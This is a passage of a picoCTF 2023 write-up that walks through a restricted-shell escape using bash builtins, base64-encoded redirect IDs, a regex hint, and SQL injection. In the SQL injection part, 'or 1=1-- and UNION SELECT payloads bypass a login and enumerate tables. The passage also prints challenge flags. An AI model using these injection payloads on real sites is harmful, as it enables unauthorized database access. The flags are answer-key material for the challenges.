+<p>Additional details will be available after launching your challenge instance.</p>
+</blockquote>
+<hr>
+<p>Upon entering, we might want to look around. However, we instantly come up with a problem:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Specialer$ ls  
+</span></span><span class="line"><span class="cl">-bash: ls: command not found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From the looks of it, ls is not accessible in our PATH. Specifying the full path does not help, and we soon find that we may not have access to any binaries:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Specialer$ /usr/bin/ls  
+</span></span><span class="line"><span class="cl">-bash: /usr/bin/ls: No such file or directory  
+</span></span><span class="line"><span class="cl">Specialer$ locate ls  
+</span></span><span class="line"><span class="cl">-bash: locate: command not found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using tab auto-complete to navigate, we can see we are in a very restricted environment, and the only binary available is bash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Specialer$ cd /  
+</span></span><span class="line"><span class="cl">bin/   home/  lib/   lib64/
+</span></span><span class="line"><span class="cl">Specialer$ cd /bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note: Tabbing at / suggests bin, home, lib and lib64. Tabbing at /bin/ auto suggessts bash. This must be the only file in the directory.</p>
+<p>At least with bash, we still have access to built-ins. Since our terminal commands are so limited, we can actually list them all by pressing tab twice on an empty line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Specialer</span><span class="o">$</span>    
+</span></span><span class="line"><span class="cl"><span class="o">!</span>          <span class="n">builtin</span>    <span class="n">dirs</span>       <span class="n">exit</span>       <span class="n">history</span>    <span class="n">pushd</span>      <span class="n">suspend</span>    <span class="n">unalias</span>  
+</span></span><span class="line"><span class="cl"><span class="o">./</span>         <span class="n">caller</span>     <span class="n">disown</span>     <span class="k">export</span>     <span class="k">if</span>         <span class="n">pwd</span>        <span class="n">test</span>       <span class="n">unset</span>  
+</span></span><span class="line"><span class="cl"><span class="p">:</span>          <span class="k">case</span>       <span class="k">do</span>         <span class="bp">false</span>      <span class="ow">in</span>         <span class="n">read</span>       <span class="n">then</span>       <span class="n">until</span>  
+</span></span><span class="line"><span class="cl"><span class="p">[</span>          <span class="n">cd</span>         <span class="n">done</span>       <span class="n">fc</span>         <span class="n">jobs</span>       <span class="n">readarray</span>  <span class="n">time</span>       <span class="n">wait</span>  
+</span></span><span class="line"><span class="cl"><span class="p">[[</span>         <span class="n">command</span>    <span class="n">echo</span>       <span class="n">fg</span>         <span class="n">kill</span>       <span class="n">readonly</span>   <span class="n">times</span>      <span class="k">while</span>  
+</span></span><span class="line"><span class="cl"><span class="p">]]</span>         <span class="n">compgen</span>    <span class="k">elif</span>       <span class="n">fi</span>         <span class="n">let</span>        <span class="k">return</span>     <span class="n">trap</span>       <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="n">alias</span>      <span class="n">complete</span>   <span class="k">else</span>       <span class="k">for</span>        <span class="n">local</span>      <span class="n">select</span>     <span class="bp">true</span>       <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="n">bash</span>       <span class="n">compopt</span>    <span class="n">enable</span>     <span class="n">function</span>   <span class="n">logout</span>     <span class="n">set</span>        <span class="n">type</span>          
+</span></span><span class="line"><span class="cl"><span class="n">bg</span>         <span class="k">continue</span>   <span class="n">esac</span>       <span class="n">getopts</span>    <span class="n">mapfile</span>    <span class="n">shift</span>      <span class="n">typeset</span>       
+</span></span><span class="line"><span class="cl"><span class="n">bind</span>       <span class="n">coproc</span>     <span class="n">eval</span>       <span class="nb">hash</span>       <span class="n">popd</span>       <span class="n">shopt</span>      <span class="n">ulimit</span>        
+</span></span><span class="line"><span class="cl"><span class="k">break</span>      <span class="n">declare</span>    <span class="n">exec</span>       <span class="n">help</span>       <span class="n">printf</span>     <span class="n">source</span>     <span class="n">umask</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can utilize <code>echo</code> to see one directory layer at a time:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Specialer$ echo *  
+</span></span><span class="line"><span class="cl">abra ala sim
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Specialer$ echo */*  
+</span></span><span class="line"><span class="cl">abra/cadabra.txt abra/cadaniel.txt ala/kazam.txt ala/mode.txt sim/city.txt sim/salabim.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have several txt files here to view, but unfortunately no common binary to read them with. Bash also comes with a read built-in, combined with echo, we can output contents within files</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Specialer$ read IFR &lt; abra/cadabra.txt; echo $IFR  
+</span></span><span class="line"><span class="cl">Nothing up my sleeve!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that the contents are displayed, perhaps one option can give us a flag?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Specialer$ read IFR &lt; ala/kazam.txt; echo $IFR  
+</span></span><span class="line"><span class="cl">return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="useless">Useless
+</h3><blockquote>
+<p>There&rsquo;s an interesting script in the user&rsquo;s home directory</p>
+<p>Additional details will be available after launching your challenge instance.</p>
+</blockquote>
+<hr>
+<p>For this challenge we are given a simple script, and told to explore the script to obtain the flag.</p>
+<p>Firstly, we are required to connect to the challenge machine via ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh picoplayer@saturn.picoctf.net -p PORT
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The port number is customized to your own launched instances.</p>
+<p>we see the script in our home directory, with executable premissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:~$ ls -al  
+</span></span><span class="line"><span class="cl">total 16  
+</span></span><span class="line"><span class="cl">drwxr-xr-x 1 picoplayer picoplayer   20 Mar 17 18:38 .  
+</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root       root         24 Mar 16 02:30 ..  
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout  
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc  
+</span></span><span class="line"><span class="cl">drwx------ 2 picoplayer picoplayer   34 Mar 17 18:38 .cache  
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile  
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root       root        517 Mar 16 01:30 useless
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First, we check the kind of file we are working with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:~$ file useless    
+</span></span><span class="line"><span class="cl">useless: Bourne-Again shell script, ASCII text executable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is a bash script, written in plaintext. We will be able to easily view the contents with a simple <code>cat</code> command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">picoplayer@challenge:~$ cat useless    
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash  </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Basic mathematical operations via command-line arguments  </span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> !<span class="o">=</span> <span class="m">3</span> <span class="o">]</span>  
+</span></span><span class="line"><span class="cl"><span class="k">then</span>  
+</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> <span class="s2">&#34;Read the code first&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">else</span>  
+</span></span><span class="line"><span class="cl">       <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;add&#34;</span> <span class="o">]]</span>  
+</span></span><span class="line"><span class="cl">       <span class="k">then</span>    
+</span></span><span class="line"><span class="cl">         <span class="nv">sum</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">+</span> <span class="nv">$3</span> <span class="k">))</span>  
+</span></span><span class="line"><span class="cl">         <span class="nb">echo</span> <span class="s2">&#34;The Sum is: </span><span class="nv">$sum</span><span class="s2">&#34;</span>     
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">       <span class="k">elif</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;sub&#34;</span> <span class="o">]]</span>  
+</span></span><span class="line"><span class="cl">       <span class="k">then</span>    
+</span></span><span class="line"><span class="cl">         <span class="nv">sub</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">-</span> <span class="nv">$3</span> <span class="k">))</span>  
+</span></span><span class="line"><span class="cl">         <span class="nb">echo</span> <span class="s2">&#34;The Substract is: </span><span class="nv">$sub</span><span class="s2">&#34;</span>    
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">       <span class="k">elif</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;div&#34;</span> <span class="o">]]</span>  
+</span></span><span class="line"><span class="cl">       <span class="k">then</span>    
+</span></span><span class="line"><span class="cl">         <span class="nv">div</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">/</span> <span class="nv">$3</span> <span class="k">))</span>  
+</span></span><span class="line"><span class="cl">         <span class="nb">echo</span> <span class="s2">&#34;The quotient is: </span><span class="nv">$div</span><span class="s2">&#34;</span>    
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">       <span class="k">elif</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;mul&#34;</span> <span class="o">]]</span>  
+</span></span><span class="line"><span class="cl">       <span class="k">then</span>  
+</span></span><span class="line"><span class="cl">         <span class="nv">mul</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$2</span> <span class="o">*</span> <span class="nv">$3</span> <span class="k">))</span>  
+</span></span><span class="line"><span class="cl">         <span class="nb">echo</span> <span class="s2">&#34;The product is: </span><span class="nv">$mul</span><span class="s2">&#34;</span>    
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">       <span class="k">else</span>  
+</span></span><span class="line"><span class="cl">         <span class="nb">echo</span> <span class="s2">&#34;Read the manual&#34;</span>  
+</span></span><span class="line"><span class="cl">           
+</span></span><span class="line"><span class="cl">       <span class="k">fi</span>  
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It appears the script is performing basic math, based on whatever operation you tell it to perform. For example, a division problem</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:~$ ./useless div 10 2  
+</span></span><span class="line"><span class="cl">The quotient is: 5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we don&rsquo;t supply 3 arguments, we are told to read the code. If we don&rsquo;t supply a valid math operation, we are told to read the manual. There is not much to go on with this program here. We can see if a manual exists for this by using <code>man</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man useless    
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">useless  
+</span></span><span class="line"><span class="cl">    useless, -- This is a simple calculator script  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">SYNOPSIS  
+</span></span><span class="line"><span class="cl">    useless, [add sub mul div] number1 number2  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">DESCRIPTION  
+</span></span><span class="line"><span class="cl">    Use the useless, macro to make simple calulations like addition,subtraction, multi-  
+</span></span><span class="line"><span class="cl">    plication and division.  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Examples  
+</span></span><span class="line"><span class="cl">    ./useless add 1 2  
+</span></span><span class="line"><span class="cl">      This will add 1 and 2 and return 3  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ./useless mul 2 3  
+</span></span><span class="line"><span class="cl">      This will return 6 as a product of 2 and 3  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ./useless div 6 3  
+</span></span><span class="line"><span class="cl">      This will return 2 as a quotient of 6 and 3  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ./useless sub 6 5  
+</span></span><span class="line"><span class="cl">      This will return 1 as a remainder of substraction of 5 from 6  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Authors  
+</span></span><span class="line"><span class="cl">    This script was designed and developed by Cylab Africa  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_5562}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Turns out a man page exists, and our flag was placed here as well. Great..</p>
+<h2 id="web">Web
+</h2><h3 id="findme">findme
+</h3><blockquote>
+<p>Help us test the form by submiting the username as <code>test</code> and password as <code>test!</code> The website running <a class="link" href="http://saturn.picoctf.net:54197/"  target="_blank" rel="noopener"
+    >here</a></p>
+</blockquote>
+<hr>
+<p>Upon logging in, we cycle through a couple blank pages very quickly before landing at <code>http://saturn.picoctf.net:54197/home</code>. The page contains a search bar and a small note:
+&ldquo;I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)&rdquo;</p>
+<p>Searching for a few keywords leads us to no result. The note on this page mentions the redirects as well, so let&rsquo;s use burpsuite to catch and analyze each step that&rsquo;s occuring.
+First login request:</p>
+<p><img src="/p/picoctf_2023/images/20230327201435.png"
+	width="795"
+	height="333"
+	srcset="/p/picoctf_2023/images/20230327201435_hu15506622703165451714.png 480w, /p/picoctf_2023/images/20230327201435_hu5147261684006859904.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="572px"
+	
+></p>
+<p>First redirect:</p>
+<p><img src="/p/picoctf_2023/images/20230327201546.png"
+	width="748"
+	height="292"
+	srcset="/p/picoctf_2023/images/20230327201546_hu14709979164987476217.png 480w, /p/picoctf_2023/images/20230327201546_hu6899080163056471006.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="614px"
+	
+></p>
+<p>Second redirect:</p>
+<p><img src="/p/picoctf_2023/images/20230327201622.png"
+	width="757"
+	height="293"
+	srcset="/p/picoctf_2023/images/20230327201622_hu12742024698248473121.png 480w, /p/picoctf_2023/images/20230327201622_hu9841261375081466767.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="258"
+		data-flex-basis="620px"
+	
+></p>
+<p>Then finally we are sent to home. There isn&rsquo;t much to go on aside from the second redirect has an id value that looks like base64 encoding. Decoding the string:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ echo &#34;bF90aGVfd2F5XzAxZTc0OGRifQ==&#34; | base64 -d
+</span></span><span class="line"><span class="cl">l_the_way_01e748db}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is looking like half of a flag. Combining the two id values together and base64 decoding might get us the flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==&#34; | base64 -d
+</span></span><span class="line"><span class="cl">picoCTF{proxies_all_the_way_01e748db}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="matchtheregex">MatchTheRegex
+</h3><blockquote>
+<p>How about trying to match a regular expression The website is running <a class="link" href="http://saturn.picoctf.net:49351/"  target="_blank" rel="noopener"
+    >here</a>.</p>
+</blockquote>
+<hr>
+<p>Going to the page, we see an input box to input our search. Based on the name, my first thought is that this will be a regular expression search, where we must input a regex term that will hit positive for specifically the flag. After trying several different regex queries, I&rsquo;m not having any luck. Looking at the page source, I notice a hint displayed in comments:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nx">send_request</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">val</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// ^p.....F!?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">fetch</span><span class="p">(</span><span class="sb">`/flag?input=</span><span class="si">${</span><span class="nx">val</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">			<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="kr">const</span> <span class="nx">res_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">alert</span><span class="p">(</span><span class="nx">res_json</span><span class="p">.</span><span class="nx">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">})</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>^p.....F!?</code>
+In regex searches, ^ refers to the start of a line and $ refers to the end of a line, so perhaps this hint can be a working query?</p>
+<p><img src="/p/picoctf_2023/images/20230327204033.png"
+	width="412"
+	height="389"
+	srcset="/p/picoctf_2023/images/20230327204033_hu17707727331521816520.png 480w, /p/picoctf_2023/images/20230327204033_hu2790173058666885558.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="105"
+		data-flex-basis="254px"
+	
+></p>
+<p>Unfortunately not..
+Playing with the provided hint a little more, I get a successful match by being more generic:</p>
+<p><img src="/p/picoctf_2023/images/20230327204320.png"
+	width="410"
+	height="376"
+	srcset="/p/picoctf_2023/images/20230327204320_hu8715539586496339253.png 480w, /p/picoctf_2023/images/20230327204320_hu5084801361851729214.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="261px"
+	
+></p>
+<p>Despite being a regex based search, and the commented page source including the ^ marker for the beginning of a line, including the ^ in our search causes it to fail..
+<code>picoCTF{succ3ssfully_matchtheregex_f89ea585}</code></p>
+<h3 id="more_sqli">More_SQLi
+</h3><blockquote>
+<p>Can you find the flag on this website. Try to find the flag <a class="link" href="http://saturn.picoctf.net:53241/"  target="_blank" rel="noopener"
+    >here</a></p>
+</blockquote>
+<hr>
+<p>Thanks to <a class="link" href="https://ctftime.org/writeup/21125"  target="_blank" rel="noopener"
+    >sergyperov</a> for the helpful writeup!</p>
+<hr>
+<p>Entering the site we see a login page. Considering the name of the challenge, we will start with a simple SQL injection payload: <code>'or 1=1-- </code>
+On the first attempt with a random input, we get an error. This is more useful than usual, however, as it tells us the SQL query happening in the background:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: &#39;or 1=1-- 
+</span></span><span class="line"><span class="cl">password: 345534
+</span></span><span class="line"><span class="cl">SQL query: SELECT id FROM users WHERE password = &#39;345534&#39; AND username = &#39;&#39;or 1=1-- &#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since password is being called first, we can insert our injection into this field and it should work.
+After bypassing login, we see a table of information:</p>
+<p><img src="/p/picoctf_2023/images/20230328074137.png"
+	width="588"
+	height="579"
+	srcset="/p/picoctf_2023/images/20230328074137_hu14992552188465062685.png 480w, /p/picoctf_2023/images/20230328074137_hu11831130007920494916.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="101"
+		data-flex-basis="243px"
+	
+></p>
+<p>There&rsquo;s no flag here, but one of the addresses seems to be a little interesting: &ldquo;Maybe all the tables&rdquo;. Doing our regular SQL injection <code>'or 1=1-- </code> in the search bar results in the same information. It appears that although we are dumping all information from the current table, the flag is actually in a different table? In order to dump information in other tables we will look into UNION injections.</p>
+<p>First to explore union injections, we need to know the number of columns in this table. With this challenge, we can clearly see three tables, but just to be sure, we will check a UNION injection including 3 columns. If the column number doesn&rsquo;t match the SQL query, the search will fail.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Kampala&#39; UNION SELECT NULL,NULL,NULL-- 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/picoctf_2023/images/20230328074947.png"
+	width="579"
+	height="336"
+	srcset="/p/picoctf_2023/images/20230328074947_hu5945281423997108436.png 480w, /p/picoctf_2023/images/20230328074947_hu17975780395891712340.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
+<p>Note that choosing Kampala to search isn&rsquo;t required, but it can make it easier to see our row of NULLs between it and the City/Address/Phone header.</p>
+<p>From here, we need to know which columns might be text injectable. Since city and address contain strings, these two are likely, however phone consists of numbers so possibly not the third column. Testing all 3 at once:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Kampala&#39; UNION SELECT &#34;abc&#34;,&#34;abc&#34;,&#34;abc&#34;--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/picoctf_2023/images/20230328075303.png"
+	width="581"
+	height="361"
